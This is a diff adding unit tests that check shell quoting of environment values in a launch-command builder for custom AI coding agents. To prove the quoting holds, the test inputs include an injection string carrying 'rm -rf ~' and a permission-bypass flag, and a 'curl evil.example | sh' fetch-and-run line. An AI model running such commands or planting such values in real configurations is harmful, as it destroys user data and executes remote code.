@@ -194,3 +194,93 @@ describe('assembleResumeCommand', () => {
     ).toBe('aider')
   })
 })
+
+describe('quoting by construction — env values can never become shell syntax or extra argv', () => {
+  const proxyWith = (args: string): CustomAgent => ({
+    id: 'custom:proxy',
+    label: 'Proxy',
+    launchCmd: 'claude-wopr',
+    baseAgent: 'claude',
+    args
+  })
+
+  it('a value carrying spaces stays ONE argument (the token boundary is fixed before expansion)', () => {
+    const { command } = assembleLaunchCommand(
+      { agentId: 'custom:aider', customAgent: proxyWith('--model ${env:SPACED}') },
+      { SPACED: 'two words' }
+    )
+    expect(command).toBe("claude-wopr '--model' 'two words'")
+  })
+
+  it('a value carrying `;`, backticks, and $() reaches the shell as ONE literal argument', () => {
+    const hostile = "x; rm -rf ~; `touch /tmp/pwn`; $(id) --dangerously-skip-permissions"
+    const { command } = assembleLaunchCommand(
+      { agentId: 'custom:aider', customAgent: proxyWith('--model ${env:EVIL}') },
+      { EVIL: hostile }
+    )
+    // Exactly one argv token after --model: the whole hostile string, single-quoted. Nothing in it
+    // can smuggle a flag (it is one argument) or read as syntax (it is quoted).
+    expect(command).toBe(`claude-wopr '--model' '${hostile}'`)
+    // The byte-equality above IS the proof: the entire hostile string sits inside one pair of
+    // single quotes (it contains no quote of its own to break out with), so the flag it carries
+    // is data inside --model's value, not a fourth argv token.
+    expect(command.endsWith("'")).toBe(true)
+  })
+
+  it('a launchCmd env value expanding to shell metacharacters is fenced into a literal', () => {
+    const { command } = assembleLaunchCommand(
+      {
+        agentId: 'custom:aider',
+        customAgent: {
+          id: 'custom:aider',
+          label: 'Aider',
+          launchCmd: '${env:AGENT_BIN}',
+          promptInjectionMode: 'argv'
+        }
+      },
+      { AGENT_BIN: 'agent; curl evil.example | sh' }
+    )
+    expect(command).toBe("'agent; curl evil.example | sh'")
+  })
+
+  it('a launchCmd env value that is a plain path stays bare', () => {
+    const { command } = assembleLaunchCommand(
+      {
+        agentId: 'custom:aider',
+        customAgent: {
+          id: 'custom:aider',
+          label: 'Aider',
+          launchCmd: '${env:AGENT_BIN} serve',
+          promptInjectionMode: 'argv'
+        }
+      },
+      { AGENT_BIN: '/opt/agents/bin/aider' }
+    )
+    expect(command).toBe('/opt/agents/bin/aider serve')
+  })
+
+  it('a launchCmd with no env tokens passes through byte-for-byte, raw shell text included', () => {
+    const { command } = assembleLaunchCommand(
+      {
+        agentId: 'custom:aider',
+        customAgent: {
+          id: 'custom:aider',
+          label: 'Aider',
+          launchCmd: 'FOO=1 aider --no-git',
+          promptInjectionMode: 'argv'
+        }
+      },
+      {}
+    )
+    expect(command).toBe('FOO=1 aider --no-git')
+  })
+
+  it('an args token whose reference is unset vanishes and is reported missing', () => {
+    const { command, missingEnv } = assembleLaunchCommand(
+      { agentId: 'custom:aider', customAgent: proxyWith('--model ${env:GONE} --verbose') },
+      {}
+    )
+    expect(command).toBe("claude-wopr '--model' '--verbose'")
+    expect(missingEnv).toEqual(['GONE'])
+  })
+})
